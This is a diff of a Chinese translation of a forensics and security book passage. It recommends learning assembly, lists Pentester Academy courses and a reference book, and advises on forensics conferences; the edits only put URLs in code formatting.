 为什么要学习汇编？熟练掌握汇编有助于人们理解计算机在底层是如何工作的。汇编之于科学，就像微积分之于数学和物理。正如学习微积分能让你瞬间理解学校物理课上的所有内容一样，学习汇编能让你对高层编程语言（C、C++ 等）背后的运作一目了然。
 
-Pentester Academy 提供了两门关于汇编和壳编码（shellcoding）的课程。一门针对 32 位系统，32 位和 64 位的课程分别在 http://www.pentesteracademy.com/course?id=3 和 http://www.pentesteracademy.com/course?id=7 提供。这两门课程都将让你对汇编有一个基础的理解，并且内容远超本书所涵盖范围。
+Pentester Academy 提供了两门关于汇编和壳编码（shellcoding）的课程。一门针对 32 位系统，32 位和 64 位的课程分别在 `http://www.pentesteracademy.com/course?id=3` 和 `http://www.pentesteracademy.com/course?id=7` 提供。这两门课程都将让你对汇编有一个基础的理解，并且内容远超本书所涵盖范围。
 
 如果你想深入研究汇编并探索上述 Pentester 书籍中未涵盖的主题，你可能会喜欢 Daniel Kusswurm 写的《Modern X86 Assembly Language Programming》。这本书涵盖了许多 Pentester Academy 课程未涵盖的主题（因为这些课程侧重于壳编码和恶意软件逆向）。额外主题包括诸如在新的中使用的浮点寄存器和高级向量扩展 (AVX) 等项目
 
@@ -8069,9 +9424,9 @@ Pentester Academy 提供了两门关于汇编和壳编码（shellcoding）的课
 
 加入充满活力的本地和在线社区是一件很棒的事情。然而，没有什么比得上一场精彩的会议。我过去所做的许多研究项目都是世界各地会议者的直接结果。会议是建立人脉、与具有互补技能和专业领域知识的人交流的绝佳场所。
 
-取证会议良好的入门列表可以在 http://forensicswiki.org/wiki/Upcoming_events#Conferences 找到。《Forensics Magazine》杂志在 http://www.forensicmag.com/events 上也列出了一些会议。我还没有找到一个良好的数字取证会议主列表。我希望尝试通过 Google 搜索来定位专门从事取证的会议。
+取证会议良好的入门列表可以在 `http://forensicswiki.org/wiki/Upcoming_events#Conferences` 找到。《Forensics Magazine》杂志在 `http://www.forensicmag.com/events` 上也列出了一些会议。我还没有找到一个良好的数字取证会议主列表。我希望尝试通过 Google 搜索来定位专门从事取证的会议。
 
-有很多优秀的安全会议可以为对取证感兴趣的人提供价值。我最喜欢的寻找会议列表的地方是 Concise Courses (http://concise-courses.com) 和 Security Organizer (http://secure.info)。
+有很多优秀的安全会议可以为对取证感兴趣的人提供价值。我最喜欢的寻找会议列表的地方是 Concise Courses (`http://concise-courses.com`) 和 Security Organizer (`http://secure.info`)。
 
 既然你找到了一些要参加的会议，在现场你应该做什么呢？参与进去！如果有取证竞赛，而且你有时间，请考虑参赛。现在可能赢不了，但你几乎能学到很多。通常会有人为初学者提供一些指导。提问。不要害怕与演讲者交流。除少数例外，大多数人都平易相处并乐于交流。
 
